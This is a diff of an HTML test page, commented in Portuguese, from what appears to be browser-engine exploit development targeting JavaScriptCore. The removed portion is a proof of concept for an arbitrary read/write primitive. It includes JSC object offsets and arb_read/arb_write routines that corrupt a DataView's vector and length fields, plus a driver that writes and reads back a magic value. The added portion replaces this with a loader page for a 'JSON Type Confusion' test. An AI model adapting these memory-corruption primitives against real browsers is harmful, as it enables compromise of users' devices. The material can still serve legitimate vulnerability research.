@@ -1,119 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - Leitura/Escrita Arbitrária (R/W)</title>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
+    <title>Teste Isolado - JSON Type Confusion</title>
     <style>
-        body { font-family: monospace; background: #111; color: #eee; }
-        pre { white-space: pre-wrap; word-wrap: break-word; border: 1px solid #555; padding: 10px; background: #222; }
-        .good { color: #73c991; }
-        .error { color: #f47174; }
-        .critical { background-color: #d12f2f; color: white; font-weight: bold; padding: 2px; }
-        .vuln { background-color: #f89d13; color: black; font-weight: bold; padding: 2px; }
-        .info { color: #61afef; }
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
+        #output-advanced { /* ID usado por logS3 */
+            background: #222;
+            border: 1px solid #444;
+            padding: 10px;
+            height: 75vh; 
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+        /* Estilos básicos de log para melhor visualização */
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
+        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; }
+        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Prova de Conceito: Leitura/Escrita Arbitrária</h1>
-    <p>Esta PoC tentará escrever um valor em um endereço de memória arbitrário e depois o lerá de volta para verificação.</p>
-    <hr>
-    <pre id="log"></pre>
-    
-    <script>
-        const logElement = document.getElementById('log');
-        function log(message, type = 'info') {
-            console.log(message);
-            const span = document.createElement('span');
-            span.className = type;
-            span.textContent = message + '\n';
-            logElement.appendChild(span);
-        }
+    <h1>Teste Isolado: JSON Type Confusion</h1>
+    <p>Abra o console do desenvolvedor para verificar possíveis erros que não são capturados no log da página.</p>
+    <button id="runIsolatedTestBtn">Iniciar Teste Isolado</button>
+    <div id="output-advanced"></div>
 
-        // ==============================================================================
-        // --- SEÇÃO 1: DEPENDÊNCIAS (Copiadas dos seus arquivos .mjs) ---
-        // ==============================================================================
-
-        // --- Conteúdo de utils.mjs ---
-        class AdvancedInt64 {
-            constructor(low, high) { this._isAdvancedInt64 = true; let buffer = new Uint32Array(2); let is_one_arg = false; if (arguments.length === 1) { is_one_arg = true; } if (arguments.length === 0) { low = 0; high = 0; is_one_arg = false; } if (!is_one_arg) { if (typeof low !== 'number' || isNaN(low)) { low = 0; } if (typeof high !== 'number' || isNaN(high)) { high = 0; } if (low instanceof AdvancedInt64 && high === undefined) { buffer[0] = low.low(); buffer[1] = low.high(); this.buffer = buffer; return; } } const check_range = (x) => Number.isInteger(x) && x >= 0 && x <= 0xFFFFFFFF; if (is_one_arg) { if (typeof (low) === 'number') { if (!Number.isSafeInteger(low)) { throw TypeError('number arg must be a safe integer'); } buffer[0] = low & 0xFFFFFFFF; buffer[1] = Math.floor(low / (0xFFFFFFFF + 1)); } else if (typeof (low) === 'string') { let str = low; if (str.startsWith('0x')) { str = str.slice(2); } if (str.includes('_')) str = str.replace('_', ''); if (str.length > 16) { throw RangeError('AdvancedInt64 string input too long'); } str = str.padStart(16, '0'); const highStr = str.substring(0, 8); const lowStr = str.substring(8, 16); buffer[1] = parseInt(highStr, 16); buffer[0] = parseInt(lowStr, 16); } else if (low instanceof AdvancedInt64) { buffer[0] = low.low(); buffer[1] = low.high(); } else { throw TypeError('single arg must be number, hex string or AdvancedInt64'); } } else { if (!check_range(low) || !check_range(high)) { throw RangeError(`low/high (${low}, ${high}) must be uint32 numbers after initial type check.`); } buffer[0] = low; buffer[1] = high; } this.buffer = buffer; }
-            low() { return this.buffer[0]; }
-            high() { return this.buffer[1]; }
-            equals(other) { if (!isAdvancedInt64Object(other)) { return false; } return this.low() === other.low() && this.high() === other.high(); }
-            toString(hex = false) { if (hex) { let high_str = this.high().toString(16).padStart(8, '0'); let low_str = this.low().toString(16).padStart(8, '0'); return `0x${high_str}${low_str}`; } return this.toNumber().toString(); }
-            toNumber() { return this.high() * (0xFFFFFFFF + 1) + this.low(); }
-            add(val) { if (!(val instanceof AdvancedInt64)) { val = new AdvancedInt64(val); } const low_sum_64 = (this.low() & 0xFFFFFFFF) + (val.low() & 0xFFFFFFFF); const carry = low_sum_64 > 0xFFFFFFFF ? 1 : 0; const high_sum_64 = (this.high() & 0xFFFFFFFF) + (val.high() & 0xFFFFFFFF) + carry; const newLow = low_sum_64 >>> 0; const newHigh = high_sum_64 >>> 0; return new AdvancedInt64(newLow, newHigh); }
-            sub(val) { if (!(val instanceof AdvancedInt64)) { val = new AdvancedInt64(val); } const neg_val = new AdvancedInt64(~val.low(), ~val.high()).add(1); return this.add(neg_val); }
-        }
-        function isAdvancedInt64Object(obj) { return obj && obj._isAdvancedInt64 === true; }
-        function toHex(val, bits = 32) { if (isAdvancedInt64Object(val)) { try { return val.toString(true); } catch(e) { return `AdvInt64(Error)`; } } return '0x' + (val >>> 0).toString(16).padStart(bits / 4, '0'); }
-        async function PAUSE(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-        // --- Conteúdo de config.mjs ---
-        const JSC_OFFSETS = { ArrayBufferView: { M_VECTOR_OFFSET: 0x10, M_LENGTH_OFFSET: 0x18, M_MODE_OFFSET: 0x1C }};
-        const OOB_CONFIG = { ALLOCATION_SIZE: 32768, BASE_OFFSET_IN_DV: 128, INITIAL_BUFFER_SIZE: 32 };
-
-        // --- Conteúdo de core_exploit.mjs ---
-        let oob_array_buffer_real = null;
-        let oob_dataview_real = null;
-        let isOOBEnvironmentSetup = false;
-        const toHexHelper = (val, bits = 32) => toHex(val, bits);
-        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
-        const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-        const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
-
-        function clearOOBEnvironment() { oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false; }
-        function isOOBReady() { let l=false; if(isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real){try{if(oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET+3){l=(oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true)===0xFFFFFFFF)}}catch(e){l=false}} return isOOBEnvironmentSetup && oob_array_buffer_real instanceof ArrayBuffer && oob_dataview_real instanceof DataView && oob_array_buffer_real.byteLength>0 && oob_dataview_real.buffer===oob_array_buffer_real && l; }
-        function oob_read_absolute(offset, len) { return len===8 ? new AdvancedInt64(oob_dataview_real.getUint32(offset,true), oob_dataview_real.getUint32(offset+4,true)) : oob_dataview_real.getUint32(offset,true); }
-        function oob_write_absolute(offset, val, len) { if(len===8){oob_dataview_real.setUint32(offset, val.low(), true); oob_dataview_real.setUint32(offset+4, val.high(), true);} else {oob_dataview_real.setUint32(offset, Number(val), true);} }
-        async function triggerOOB_primitive() { if(isOOBReady()){return true} clearOOBEnvironment(); oob_array_buffer_real=new ArrayBuffer(OOB_CONFIG.ALLOCATION_SIZE); oob_dataview_real=new DataView(oob_array_buffer_real,0,OOB_CONFIG.ALLOCATION_SIZE); oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET,0xFFFFFFFF,true); isOOBEnvironmentSetup=true; return true; }
-        async function _perform_explicit_dv_reset_after_arb_op() { try { if (isOOBReady()){ const t = oob_read_absolute(0,1); oob_write_absolute(0, t, 1);}} catch(e){} }
-        async function arb_read(addr, len) { if(!isOOBReady()){await triggerOOB_primitive()} let addr64=isAdvancedInt64Object(addr)?addr:new AdvancedInt64(addr); let m_vector_orig,m_length_orig,m_mode_orig,res=null; try { m_vector_orig=oob_read_absolute(OOB_DV_M_VECTOR_OFFSET,8); m_length_orig=oob_read_absolute(OOB_DV_M_LENGTH_OFFSET,4); m_mode_orig=oob_read_absolute(OOB_DV_M_MODE_OFFSET,4); oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,addr64,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,0xFFFFFFFF,4); res = len === 8 ? new AdvancedInt64(oob_dataview_real.getUint32(0,true), oob_dataview_real.getUint32(4,true)) : oob_dataview_real.getUint32(0,true); return res;} finally {if(m_vector_orig && isOOBReady()){oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,m_vector_orig,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,m_length_orig,4); oob_write_absolute(OOB_DV_M_MODE_OFFSET,m_mode_orig,4); await _perform_explicit_dv_reset_after_arb_op();}}}
-        async function arb_write(addr, val, len) { if(!isOOBReady()){await triggerOOB_primitive()} let addr64=isAdvancedInt64Object(addr)?addr:new AdvancedInt64(addr); let m_vector_orig,m_length_orig,m_mode_orig; try { m_vector_orig=oob_read_absolute(OOB_DV_M_VECTOR_OFFSET,8); m_length_orig=oob_read_absolute(OOB_DV_M_LENGTH_OFFSET,4); m_mode_orig=oob_read_absolute(OOB_DV_M_MODE_OFFSET,4); oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,addr64,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,0xFFFFFFFF,4); if(len===8){const val64=isAdvancedInt64Object(val)?val:new AdvancedInt64(val); oob_dataview_real.setUint32(0,val64.low(),true); oob_dataview_real.setUint32(4,val64.high(),true);}else{oob_dataview_real.setUint32(0,Number(val),true);}} finally {if(m_vector_orig && isOOBReady()){oob_write_absolute(OOB_DV_M_VECTOR_OFFSET,m_vector_orig,8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,m_length_orig,4); oob_write_absolute(OOB_DV_M_MODE_OFFSET,m_mode_orig,4); await _perform_explicit_dv_reset_after_arb_op();}}}
-
-        // ==============================================================================
-        // --- SEÇÃO 2: LÓGICA DA PROVA DE CONCEITO ---
-        // ==============================================================================
-
-        async function runArbRwPoc() {
-            log('[+] Iniciando PoC para Leitura/Escrita Arbitrária...');
-            
-            // Um endereço de memória seguro e R/W para teste.
-            // Endereços baixos como este são geralmente parte do mapa de memória do processo.
-            const TARGET_ADDRESS = new AdvancedInt64(0x00001337);
-
-            // Um valor "mágico" e único para escrevermos, fácil de identificar.
-            const TEST_VALUE = new AdvancedInt64(0xCAFED00D, 0xDEADBEEF);
-            
-            try {
-                // ETAPA 1: Escrever o valor no endereço alvo.
-                log(`[1] Escrevendo o valor ${TEST_VALUE.toString(true)} no endereço ${TARGET_ADDRESS.toString(true)}...`);
-                await arb_write(TARGET_ADDRESS, TEST_VALUE, 8);
-                log('   ... Escrita arbitrária concluída.', 'good');
-                await PAUSE(100); // Pausa para garantir que a escrita seja concluída.
-
-                // ETAPA 2: Ler o valor de volta do mesmo endereço.
-                log(`[2] Lendo 8 bytes do endereço ${TARGET_ADDRESS.toString(true)}...`);
-                const valueRead = await arb_read(TARGET_ADDRESS, 8);
-                log(`   ... Leitura arbitrária retornou: ${valueRead.toString(true)}`, 'info');
-
-                // ETAPA 3: Verificar se o valor lido é o mesmo que o valor escrito.
-                log('[3] Verificando se os valores correspondem...');
-                if (valueRead.equals(TEST_VALUE)) {
-                    log('\n[!!!] SUCESSO! A primitiva de Leitura/Escrita Arbitrária está funcionando!', 'vuln');
-                    log('O valor lido corresponde exatamente ao valor escrito.', 'good');
-                } else {
-                    log('\n[XXX] FALHA. O valor lido é diferente do valor escrito.', 'error');
-                }
-
-            } catch (e) {
-                log(`\n[XXX] ERRO CRÍTICO DURANTE A POC DE R/W: ${e.message}`, 'critical');
-            }
-        }
-
-        // Executa a PoC.
-        runArbRwPoc();
-
-    </script>
+    <script type="module" src="js/run_isolated_test.mjs"></script>
 </body>
 </html>
